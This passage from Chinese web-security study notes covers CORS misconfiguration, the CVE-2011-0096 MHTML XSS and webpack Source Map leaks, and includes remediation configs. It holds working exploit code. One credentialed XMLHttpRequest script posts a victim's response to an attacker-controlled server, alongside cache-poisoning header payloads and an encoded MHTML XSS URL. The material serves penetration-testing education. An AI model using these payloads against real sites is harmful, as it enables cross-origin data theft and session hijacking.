请求，就都跟简单请求一样，会有一个 Origin​​ ​头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin​​ ​头信息字段。 下面是\"预检\"请求之后，浏览器的正常 CORS 请求。 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面头信息的 Origin​ ​字段是浏览器自动添加的。 下面是服务器正常的回应。 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin​ ​字段是每次回应都必定包含的。 0x04 CORS 错误配置类型 反射 Origin 头 如下配置： Access-Control-Allow-Origin: http://a.com, http://c.com 或者 Access-Control-Allow-Origin: http://*.a.com 这两种域名事实上配置是错误的，因为 CORS 标准规定，Access-Control-Allow-Origin​​ 只能配置为单个 origin, null​​ 或 *​​。如果开发者想要实现同时与多个域名共享域名的需求，则需要专门编写代码或者使用框架来协助动态生成访问控制策略。 最简单地动态生成访问控制策略的方法，就是在 Access-Control-Allow-Origin 中反射请求的 Origin 值。例如，下面是一个错误 Nginx 配置示例： add_header \"Access-Control-Allow-Origin\" $http_origin; // 单纯的 add_header “Access-Control-Allow-Credentials” “true”; 这种配置非常危险，相当于信任任意网站，给攻击者网站敞开了大门。任意攻击者网站可以直接跨域读取其资源内容。 Origin 校验错误 前缀匹配: 资源服务器在检查请求中 Origin 值时，只匹配了前缀。例如 www.example.com 想要允许 example.com 访问，但是只做了前缀匹配，导致同时信任了 example.com.attack.com 的访问，而 example.com.attack.com 是攻击者可以控制的网站。 后缀匹配：资源服务器在检查请求中 Origin 值时，只做了后缀匹配。例如 www.example.com 想要允许 example.com 访问，由于后缀匹配出错，导致允许 attackexample.com 访问。 没有转义 .​​：例如，example.com 想要允许 www.example.com 访问时，但正则匹配没有转义 .​​，导致允许 wwwaexample.com 访问。 包含匹配：我们还发现有的网站 www.example.com 想要允许 example.com，但是 Origin 校验出错，出现允许 ample.com 访问。 信任 null RFC 6564 规定，如果请求来自隐私敏感上下文时，Origin 头的值应该为 null，但是它却没有明确界定什么是隐私敏感上下文。 CORS 协议复用了 Origin 头，有些开发者在网站上配置信任 null，用于与本地 file 页面共享数据，如下所示： Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 但是事实上，除了本地 file 页面的跨域请求 Origin 头为 null 外，攻击者还可以从任意域下通过 iframe sandbox 构造 Origin 为 null 的跨域请求，如下是一段示意代码： XMLHttpRequest here’> 这就意味着任何配置有 Access-Control-Allow-Origin: null​​ ​和 Access-Control-Allow-Credentials:true​​ ​的网站等同于没有浏览器 SOP 的保护，都可以被其他任意域以这种方式读取内容。 e.g. var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", true); xhr.withCredentials = true; xhr.send();'> HTTPS 域信任 HTTP 域 中间人攻击者可以先劫持受信任 HTTP 域，然后通过这个域发送跨域请求到 HTTPS 网站，间接读取 HTTPS 域下的受保护内容。 信任自身全部子域 很多网站为了方便会将 CORS 配置为信任全部自身子域，这种配置会导致子域 XSS 的危害被强化。为了防止某个子域上 XSS 漏洞的危害其他子域，浏览器设计了 Cookie 的 httponly 标志，用于限制 Javascript 读取 Cookie，因此某个子域 XSS 不能读取带有 httponly 标记的 Cookie，难以窃取其他重要子域上的敏感内容。 但是如果这个域配置了 CORS 且信任全部子域，那么攻击者可以利用其他任意子域上 XSS 漏洞，发送跨域请求到目标重要域网站，从而获取敏感内容。 ​Origin:*​​​ 与 Credentials:true​​​ 共用 CORS 规定，Access-Control-Allow-Origin:*​​ 与 Access-Control-Allow-Credentials:true​​ 不能同时使用。浏览器会对下面这种误配置报错： Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true 这就意味着，Access-Control-Allow-Origin:*​​ 只能用于共享公开资源。 缺少 Vary:Origin​​​ 头 当资源服务器需要共享多个域名时，它需要每个不同请求域的跨域请求生成不同的访问控制策略。但一旦这个资源内容需要被缓存，则会带来 CORS 失效问题。例如，c.com 同时允许 a.com 和 b.com 共享。c.com 资源内容首先被 a.com 脚本跨域访问后被缓存，其中缓存响应头为 Access-Control-Allow-Origin: http://a.com​​”。这时，b.com 脚本则不能读取缓存响应内容，因为缓存响应头是允许 a.com 共享，而不是 b.com。HTTP 协议提供了 Vary 头，用于解决这种情况，资源服务器需要在响应头中配置 Vary:Origin​​ 头来指导缓存，为每个不同的 Origin 头缓存一份不同的内容。 0x05 挖掘利用 CORS 的漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 变换请求头的 origin 字段，如果返回包中的 Access-Control-Allow-Origin​​ 内容和发送的 origin 头内容相同，则存在此问题。 利用 前提：含有 CORS 配置的网站 利用 html 标签和表单发送请求 访问内网敏感资源 绕过返会话劫持 一般形式跨域请求利用 在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标。 方法一：检测工具 GitHub - chenjj/CORScanner: 🎯 Fast CORS misconfiguration vulnerabilities scanner EXP & POC Hello,this is evil page. CORS POC Exploit Exploit function corsExploit() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { //var datas=xhr.responseText; //alert(datas); //document.getElementById(\"demo\").innerHTML = alert(this.responseText); document.getElementById(\"demo\").innerHTML = alert(xhr.responseText); } } // request vuln page，需要攻击的目标 xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr.send(); } 绕过 http_only 获取 cookie 在攻击这服务器创建 cookiebypass.jsp​​ 在攻击者可控网站创建 steal.html​​ cors exploit function exploit() { var xhr1; var xhr2; if (window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2 = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange = function () { if (xhr1.readyState == 4 && xhr1.status == 200) { var datas = xhr1.responseText; // 攻击这服务器地址 xhr2.open(\"POST\", \"http://mob.exp:8081/manager/cookiebypass.jsp\", \"true\"); xhr2.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xhr2.send(\"ck=\" + escape(datas)); } } // 需要攻击的目标 xhr1.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr1.withCredentials = true; xhr1.send(); } exploit(); 访问 mob.exp:8081/manager/steal.html，可以看到返回内容写入 secrect.html 中。 方法二：利用 Burpsuit 搭建测试环境，Nginx 配置如下： 选择 Proxy -- Options -- Match and Replace，勾选 Request header。 将空替换为 Origin:foo.example.org​​​ 的 Enable 框。 然后在网站一阵乱点，最后在 HTTP history 来筛选带有 CORS 头部的值，然后用以上工具查看是否有配置缺陷。 Burpsuite：自动在 HTTP 请求包中加上 Origin 的头部字段。 在 Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org​​ HTTP history 列表中出现符合条件的请求包，点击 Ctrl+R（发送到 Repeater），点击 GO，观察返回的 CORS 配置。 方法三：curl 命令 curl 命令，输入 curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I 方法四：浏览器测试 利用 Ajax 发送一个简单请求，看是否允许。 var url = 'http://172.16.10.113/xxxxmail'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.send(); // 或者 $.get(\"http://172.16.10.113/xxxxmail\") ======== # 浏览器控制台示例 # 在服务器（被攻击目标） 192.168.202.110 上配置有漏洞的 nginx.conf # 打开攻击者的网站 http://xxx.xxx.xxx/，（或者随便一个网站）再打开控制台 # 在允许的域（网站），打开控制台 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} # 不允许的域 $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: ƒ, getAllResponseHeaders: ƒ, setRequestHeader: ƒ, overrideMimeType: ƒ, …} /xxxmail/xxx4/index.jsp Access to XMLHttpRequest at 'http://192.168.202.110:8081/' from origin 'http://172.16.10.113' has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header has a value 'http://mt.icoremail.net' that is not equal to the supplied origin. loginCommon.c2f53.js:1 GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK) send @ 实验测试 环境准备 我们首先修改 host 文件，加上 127.0.0.1 mob.exp 127.0.0.1 www.vuln.com 这样我们访问 www.vuln.com 就相当于服务端。服务端新建 corsvuln.jsp。 Vulnerability Page 接着在 hacker 端 mob.exp 构造 steal.html，这里我们假设是 http://mob.exp:8081/manager/steal.html Hello,this is evil page. function loadXMLDoc() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function() { if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { var datas=xhr.responseText; alert(datas); } } // request vuln page，存在漏洞的攻击目标 xhr.open(\"GET\",\"http://www.vuln.com:8081/cors/corsvuln.jsp\",\"true\") xhr.send(); } loadXMLDoc(); 根据同源策略，这是不允许的，结果也和我们想的一样。 上面说过，同源策略并不限制请求的发起和响应，只是浏览器拒绝了 js 对响应资源的操作，这点我们抓包就可以看出来。（所以说测试方法中的 1 是不对的） 我们修改 corsvuln.jsp 使用 CORS 使其可以跨域访问，添加一个 Access-Control-Allow-Origin 的返回头。 response.setHeader(\"Access-Control-Allow-Origin\", \"http://mob.exp:8081\"); 再次访问 mob.exp:8081/manager/steal.html 发现可以正常 alert 了，成功实现了跨域资源的请求。 我们只是在响应头加上了 Access-Control-Allow-Origin: http://mob.exp:8081​​ 浏览器看到这个，认为这是服务端允许的跨域请求，就不再阻拦 js 对获取内容的操作了。 获取用户凭证 方式一：存在用户凭证 Access-Control-Allow-Origin “访问控制允许凭据”值 是否可利用 备注 攻击者掌握的域名 真的 是 * 真的 否 浏览器报错 null（空值） 真的 是 任意网站使用沙盒 iframe 来获取 null 源 搜狐视频 CORS 误配置漏洞演示：https://www.youtube.com/watch?v=PWbPbtyyNi8 方式二：不存在用户凭证 Access-Control-Allow-Origin 是否可利用 攻击者掌握的域名 是 null（空值） 是 * 是 绕过基于 IP 的认证 如果目标应用程序与受害者的网络可达性，并且目标应用程序使用 IP 地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于 IP 的身份验证。 客户端缓存中毒 例如，数据报文头部中包含 X-User 标头，其值未进行任何输入验证，输出编码。 请求包 GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: 响应包 Access-Control-Allow-Origin 已被设置，Access-Control-Allow-Credentials: true 与 Vary: Origin 头已经设置。 HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: 构造存在恶意的 XSS 有效负载页面，诱使受害者触发。 var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','http://www.target.local/login',true); req.setRequestHeader('X-User', ''); req.send(); function reqListener() { location='http://www.target.local/login'; } 服务器端缓存中毒 利用 CORS 的错误配置注入任意 HTTP 头部，将其保存在服务器端缓存中，可用于构造存储类型 XSS。 利用条件：存在服务器端缓存，能够反射 Origin 头部，不会检查 Origin 头部中的特殊字符，如 \\r 利用方式：攻击 IE / Edge 用户（IE / Edge 使用 \\r 作为的 HTTP 标题段的终结符） 请求包 GET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7 回车（CR）：ASCII 码：'\\r' ，十六进制：0x0d 响应包 HTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7 如果攻击者能提前发送畸形的 Origin 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 UTF-7，可引发 XSS 中断。 配合 XSS 劫持会话 在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。 交互式 xss。通过 cors，绕过一些反会话劫持的方法，如 HTTP-Only 限制的 cookie，绑定 IP 地址的会话 ID 等，劫持用户会话。 程序猿在写 ajax 请求的时候，对目标域限制不严，有点类似于 url 跳转。 facebook 出现过这样一个案例，javascript 通过 url 里的参数进行 ajax 请求。 ​ CORS 与 CSRF 的区别 CORS 机制的目的是为了解决脚本的跨域资源请求问题，不是为了防止 CSRF。 CSRF 一般使用 form 表单提交请求，而浏览器是不会对 form 表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。 脚本的跨域请求在同源策略的限制下，响应会被拦截，即阻止获取响应，但是请求还是发送到了后端服务器。 相同点：都需要第三方网站；都需要借助 Ajax 的异步加载过程；一般都需要用户登录目标站点。 不同点：一般 CORS 漏洞用于读取受害者的敏感信息，获取请求响应的内容；而 CSRF 则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。 0x06 修复方法 修复方法是合理配置 CORS，判断 Origin 是否合法；具体说就是不让在 nginx 或 tomcat 中配置【Access-Control-Allow-Origin *​​​​​】或【Access-Control-Allow-Origin null​​​​​】。 关闭非正式开启的 CORS，不要信任全部自身子域，减少攻击面 不要配置 Access-Control-Allow-Origin​​​ 为通配符 *​​​ 或 null​​​，严格校验来自请求数据包中 Origin​​​ 的值 彻底的返回 Vary: Origin​​​ 右边，突破攻击者利用浏览器缓存进行攻击 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性 HTTPS 网站不要信任 HTTP 域 # 允许跨域请求的域，* 代表所有；null 可以用来和本地 file 页面共享数据 add_header 'Access-Control-Allow-Origin' *; # 允许请求的 header add_header 'Access-Control-Allow-Headers' *; # 允许带上 cookie 请求，不能和允许跨域请求的域 * 一同使用，Origin 需要明确的配置允许来源的域。因为 * 这种配置只能用于共享公开资源，对于共享公开资源，不应该需要身份认证。 add_header 'Access-Control-Allow-Credentials' 'true'; # 允许请求的方法，比如 GET,POST,PUT,DELETE add_header 'Access-Control-Allow-Methods' *; 修改 Nginx 配置文件 方法一：使用通配符 *​​ location / { add_header Access-Control-Allow-Origin *.xxx.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法二：指定域名白名单 根据错误配置类型，该方法有待确认。 # 使用域名 location / { add_header Access-Control-Allow-Origin http://www.xixixi123.com; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } # 指定 ip 与端口，可以逗号拼接 location / { add_header Access-Control-Allow-Origin http://10.130.222.222:6500,http://10.130.222.223:6500; add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 方法三：使用正则表达式 location ~ /myurl(.*) { if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.222):6500$' { add_header Access-Control-Allow-Origin $http_origin; } if ( $http_origin ~ '^http(s)?://(localhost|10\\.130\\.222\\.223):6500$' { add_header Access-Control-Allow-Origin $http_origin; } add_header Access-Control-Allow-Headers \"Origin， X-Requested-With, Content-Type, Accept\"; add_header Access-Control-Allow-Methods \"GET, POST, OPTIONS\"; } 说明 ​$ http_origin​​ 可以获取到请求头中的 Origin 字段；但是如果请求头没有，就获取不到了； ​^​​ 是正则表达式，表示开头位置；$​​ 是正则表达式，表示结尾位置 ​?​​ 是正则表达式，表示 s 可能有，也可能没有，这两种情况都可以匹配 .​​​ 是把 .​​ 转义成普通字符的意思 nginx 中，if 后必须加空格，然后才能写 (​​，否则会报错；nginx 中，没有 else if nginx 解决复杂请求跨域的时候需加上 aways 参数eg：add_header 'Access-Control-Allow-Origin' \"$http_origin\" always;​​ 原因：As of Nginx 1.7.5, add_header supports an \"always\" parameter which​allows CORS to work if the backend returns 4xx or 5xx status code.​​参考资料：https://gist.github.com/Stanback/7145487 白名单配置示例 Tomcat 过滤路由 package filter; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; import java.util.Arrays; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.ws.http.HTTPException; @WebFilter(\"/Cors\") public class CorsFilter implements Filter { /** * Default constructor. */ public FilterConfig config; public CorsFilter() { // TODO Auto-generated constructor stub } /** * @see Filter#destroy() */ public void destroy() { // TODO Auto-generated method stub this.config = null; } /** * @see Filter#doFilter(ServletRequest, ServletResponse, FilterChain) */ public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { //配置可信域名 String[] authhosts = {\"http://www.abc.com:8008\", \"http://www.abcyy.com\"}; String authost = \"\"; HttpServletRequest httprequest = (HttpServletRequest) request; String origin = httprequest.getHeader(\"origin\"); HttpServletResponse httpresponse = (HttpServletResponse) response; if (origin != null && !Arrays.asList(authhosts).contains(origin)) { httpresponse.sendError(403); return; } else { for (int i = 0; i 另一种配置方式 把 cors-filter-1.7.jar 与 java-property-utils-1.9.jar 这两个文件放到 tomcat 的 lib 目录下 在 tomcat 的 web.xml 中配置 CORS com.thetransactioncompany.cors.CORSFilter cors.allowOrigin * --> *.xxx.com,http://10.130.222.222:6500 cors.exposedHeaders Set-Cookie cors.supportsCredentials true CORS /* 0x07 优秀案例 组合漏洞导致的账号劫持 - 先知社区 (aliyun.com) https://www.someattack.com/Playground/About 鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户 0x00 前人栽树 跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com) -- 可以顺便看看评论 绕过浏览器 SOP，跨站窃取信息：CORS 配置安全漏洞报告及最佳部署实践 | Jianjun Chen | International Computer Science Institute | Network Security -- 推荐阅读 https://web.dev/cross-origin-resource-sharing/ https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS CVE-2018-8014，https://nvd.nist.gov/vuln/detail/CVE-2018-8014 nginx - 前端常见跨域解决方案（全） - 个人文章 - SegmentFault 思否 CORS 介绍及其漏洞检测 - 知乎 (zhihu.com) CORS 跨域漏洞修复 - 不愿透露姓名的汤姆猫 - 博客园 (cnblogs.com) (82 条消息) CORS(跨域资源共享)漏洞解决方法cors 漏洞修复追逐梦想永不停的博客-CSDN 博客 -- 测试方法说明有误 【漏洞利用】跨域资源共享（CORS）漏洞详解 - GorillaLee - 博客园 (cnblogs.com) CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ · Issue #68 · aszx87410/blog · GitHub (82 条消息) Nginx 跨域配置_程序员小强的博客-CSDN 博客 https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-27 17:33:25 "},"web/Microsoft Windows MHTML脚本代码注入漏洞.html":{"url":"web/Microsoft Windows MHTML脚本代码注入漏洞.html","title":"Microsoft Windows MHTML脚本代码注入漏洞","keywords":"","body":"0x01 漏洞描述 CVE-2011-0096 The MHTML protocol handler in Microsoft Windows XP SP2 and SP3, Windows Server 2003 SP2, Windows Vista SP1 and SP2, Windows Server 2008 Gold, SP2, R2, and R2 SP1, and Windows 7 Gold and SP1 does not properly handle a MIME format in a request for content blocks in a document, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a crafted web site that is visited in Internet Explorer, aka \"MHTML Mime-Formatted Request Vulnerability.\" Windows XP SP2 和 SP3、 Windows Server 2003 SP2、 Windows Vista SP1 和 SP2、 Windows Server 2008 Gold、 SP2、 R2 和 R2 SP1 以及 Windows 7 Gold 和 SP1 中的 MHTML 协议处理程序不能正确处理文档内容块请求中的 MIME 格式，这使得远程攻击者可以通过一个精心设计的网站进行跨网站脚本(XSS)攻击，这个网站被称为“ MHTML MIME-Formatted Request Vulnerability”，Internet Explorer 访问。 MHTML，即 MIME HTML，是由 RFC 2557 定义的，把一个多附件（如图片，flash 动画等）的网页内容都保存到单一档案的标准。这个标准由微软提出，并从 IE 5.0 对其开始支持。 同时，微软实现了 MHTML 协议，默认安装的 window 系统都带有 MHTML 协议处理程序（MHTMLProtocol Handler）。在 IE 中，当嵌入资源的 URL 的协议为 MHTML 时，IE 将调用 MHTML ProtocolHandler，把该资源当作 MHTML 格式文件解析处理。 MHTML Protocol Handler 解析 MHTML 格式文件，其结果交给 IE 渲染，不可避免的将涉及跨域、脚本访问权限等安全问题。在此过程中，IE 一旦处理不当，则会产生跨域漏洞。 0x02 POC & EXP 环境信息 // SystemInfo 主机名: WINXPIE6 OS 名称: Microsoft Windows XP Professional OS 版本: 5.1.2600 Service Pack 3 Build 2600 修补程序: 安装了 1 个修补程序。 [01]: Q147222 // IEInfo 版本：6.0.2900.5512.xpsp.080413-2111 更新版本：SP3 问题参数：locale url：mhtml:http://x.x.x.x/cm/help/dialog.jsp?locale=zh_CN ​​ 利用条件 （1）服务器对用户提交的参数未进行过滤并在 HTML 中返回； （2）用户使用存在 MS11-026 漏洞的 IE 浏览器； （3）使用 Win7 IE8 并未复现成功，只有在最古老的 WinXP IE6 复现成功，基本无利用价值。 payload （1）进行 URLencode 编码 （2）将 %0A​ 替换为 %0D%0A​ （3）将 %​ 号进行二次 url 编码变为 %25​ （4）将脚本进行 base64 编码。如 PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=​ 是 alert(\"XSS\")​ // 本地环境 mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%250D%250AContent-Type%253A%2520multipart%252Frelated%253B%2520boundary%253D_webscan_atestu%250D%250A%250D%250A--_webscan_atestu%250D%250AContent-Location%253Acookie%250D%250AContent-Transfer-Encoding%253Abase64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%253D%250D%250A--_webscan_atestu--%250D%250A%250D%250A!cookie // 还原 mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%0AContent-Type%3A%20multipart%2Frelated%3B%20boundary%3D_webscan_atestu%0A%0A--_webscan_atestu%0AContent-Location%3Acookie%0AContent-Transfer-Encoding%3Abase64%0A%0APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%3D%0A--_webscan_atestu--%0A%0A!cookie // url 解码后 mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN---- Content-Type: multipart/related; boundary=_webscan_atestu --_webscan_atestu Content-Location:cookie Content-Transfer-Encoding:base64 PHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4= --_webscan_atestu-- !cookie 需要注意一下这个 Content-Location:cookie 要和后面的 !cookie 一致。 【注】MHTML 协议，可以使用 Content-Type: text/html;​ 来标识文档的 MIME 类型。 上面的 payload 没有标明也能正常执行，加上也是可以的。 mhtml:http://172.16.10.244/coremail/help/dialog.jsp?locale=zh_CN----%250D%250AContent-Type%253A%2520multipart%252Frelated%253B%2520boundary%253D_webscan_atestu%250D%250A%250D%250A--_webscan_atestu%250D%250AContent-Type%253A%2520text%252fhtml%253B%250D%250AContent-Location%253Acookie%250D%250AContent-Transfer-Encoding%253Abase64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgibW9iIik8L3NjcmlwdD4%253D%250D%250A--_webscan_atestu--%250D%250A%250D%250A!cookie ​​ ​ EXP 详见：Microsoft Internet Explorer - MHTML Protocol Handler Cross-Site Scripting - Windows local Exploit (exploit-db.com) 0x03 修复方法 （1）服务器端过滤参数中的回车换行（%0d%0a​），使之无法满足 MTHML 协议的格式要求。 （2）对参数的长度进行限制。因为 MHTML 有固定的格式，只有长度满足，才能构造这样的条件。 0x03 前人栽树 [阿呆]: 记一次 MHTML 跨站脚本编制漏洞验证 (antgroup-inc.com) -- 好文 IE 下 MHTML 协议带来的跨域危害 (seebug.org) -- 好文 CVE - CVE-2011-0096 (mitre.org) Microsoft Security Bulletin MS11-026 - Important | Microsoft Learn ‍ ‍ ‍ ‍ ​​ ​​ Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-07-07 23:40:20 "},"web/Source Map 泄露.html":{"url":"web/Source Map 泄露.html","title":"Source Map 泄露","keywords":"","body":"0x01 漏洞描述 概述 Webpack 是一个 JavaScript 应用程序的静态资源打包器（module bundler）。它会在内部从一个或多个入口点构建一个 依赖图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle，它们均为静态资源，用于展示你的内容。 官方文档：https://webpack.docschina.org/concepts/。当然我们主要不是学习 webpack，知道它是什么就可以了，后续有开发要求再去读文档吧。 正常来讲前端代码根本不存在什么泄露一说，因为都说了是前端代码咯，本来就是可见的。由于网络安全越来越重要，一般生产环境中的 JavsScript 代码都是经过压缩和混淆的，所以可读性大大降低，这也提升了从前端的角度挖取更多信息的门槛。 大部分 Vue 等应用项目会使用 Webpack 进行打包，如果没有正确配置，就会导致项目源码泄露，可能泄露的各种信息如 API、加密算法、管理员邮箱、内部功能等等。 简单来说，Source Map 就是一个信息文件，里面储存着位置信息。转换后的代码的每一个位置，所对应的转换前的位置。 有了它，出错的时候，Debug 工具将直接显示原始代码，而不是转换后的代码，这给开发者带来了很大方便。 通过 Source Map 可以还原前端代码，恢复代码的可读性，就相当于可以反压缩和混淆。可以非常清晰地了解应用的前端业务，包括接口信息，如果前端包含加解密的逻辑的话，也非常有利于攻击者进行破解。 漏洞挖掘 手工挖掘 使用 Webpack 打包应用程序会在网站 js 同目录下生成 js.map 文件。 打开网站，F12 打开开发者工具找到含 .map 的 js 页面，进入到一个 *.js 的页面查看源码。 后缀加上 .map 访问，会打开对应的 map 页面或直接下载 590-509fef9ed53df815.js.map 将获取到 Source Map 就可以对 js 进行还原。 使用工具 Xray -- 检测，dirscan/sourcemap/default SourceDetector Chrome extension，用于发现源码文件(*.map) -- 检测 reverse-sourcemap -- 还原 SourceDetector 检测插件 SourceDetector 是一个谷歌浏览器插件，此插件可以自动的判断网站是否存在 js.map 文件。 源码：SunHuawei/SourceDetector 编译好的：Lz1y/SourceDetector-dist 备份： 下载 SourceDetector.zip 然后解压，谷歌浏览器添加扩展程序。 源码安装 下载安装 git clone https://github.com/SunHuawei/SourceDetector.git cd SourceDetector npm install bower install gulp 打开 Chrome 设置-扩展程序 点击\"加载已解压的扩展程序...\" 选择 path/to/source-detector/dist 目录 通过 Source Map 还原 JS reverse-sourcemap 这个工具，两年前发布的，居然文件和目录都能全部还原出来，牛逼。 全局安装 npm install --global reverse-sourcemap 安装目录：D:\\Java\\nvm\\v16.17.0\\node_modules\\reverse-sourcemap 然后（ -o 后面跟的是还原后的目录） reverse-sourcemap -o ./ -v 590-509fef9ed53df815.js.map 完美还原，反正就是牛！ PS C:\\Users\\xxx\\Desktop\\test> tree 卷 Windows-SSD 的文件夹 PATH 列表 卷序列号为 307E-ED05 C:. └─webpack └─_N_E └─packages └─frontend └─src ├─common │ └─helpers └─react ├─gwizzy │ ├─asyncHandlers │ ├─components │ │ └─ConversionWizard │ ├─helpers │ └─schema └─shared └─helpers 源码： 修复方式 案例查看：记录某一天安服仔的漏洞挖掘过程 临时的解决方法就是删除代码目录下的 xxx.js.map 文件； 永久的解决方法就是在 build 的时候禁用产生 map 文件的功能 在 scripts/build 下的 build.js 文件中添加如下配置： process.env.GENERATE_SOURCEMAP = 'false'; 重新 build 就不会再产生 Source Map 文件了 0x02 JavaScript Source Map 详解 jQuery 1.9发布。这是 2.0 版之前的最后一个新版本，有很多新功能，其中一个就是支持 Source Map。 访问 http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js，打开压缩后的版本，滚动到底部，你可以看到最后一行是这样的： //@ sourceMappingURL=jquery.min.map 这就是 Source Map。它是一个独立的 map 文件，与源码在同一个目录下，你可以点击进去，看看它的样子。 从源码转换讲起 JavaScript 脚本正变得越来越复杂。大部分源码（尤其是各种函数库和框架）都要经过转换，才能投入生产环境。 常见的源码转换，主要是以下三种情况： （1）压缩，减小体积。比如 jQuery 1.9 的源码，压缩前是 252KB，压缩后是 32KB。 （2）多个文件合并，减少 HTTP 请求数。 （3）其他语言编译成 JavaScript。最常见的例子就是 CoffeeScript。 这三种情况，都使得实际运行的代码不同于开发代码，除错（debug）变得困难重重。 通常，JavaScript 的解释器会告诉你，第几行第几列代码出错。但是，这对于转换后的代码毫无用处。举例来说，jQuery 1.9 压缩后只有 3 行，每行 3 万个字符，所有内部变量都改了名字。你看着报错信息，感到毫无头绪，根本不知道它所对应的原始位置。 这就是 Source map 想要解决的问题。 什么是 Source Map 简单说，Source map 就是一个信息文件，里面储存着位置信息。也就是说，转换后的代码的每一个位置，所对应的转换前的位置。 有了它，出错的时候，除错工具将直接显示原始代码，而不是转换后的代码。这无疑给开发者带来了很大方便。 ​ 目前，暂时只有 Chrome 浏览器支持这个功能。在 Developer Tools 的 Setting 设置中，确认选中\"Enable source maps\"。 如何启用 Source Map 只要在转换后的代码尾部，加上一行就可以了。 //@ sourceMappingURL=/path/to/file.js.map map 文件可以放在网络上，也可以放在本地文件系统。 如何生成 Source Map 最常用的方法是使用 Google 的 Closure 编译器。 生成命令的格式如下： java -jar compiler.jar --js script.js --create_source_map ./script-min.js.map --source_map_format=V3 --js_output_file script-min.js 各个参数的意义如下： - js： 转换前的代码文件 - create_source_map： 生成的 source map 文件 - source_map_format：source map 的版本，目前一律采用 V3。 - js_output_file： 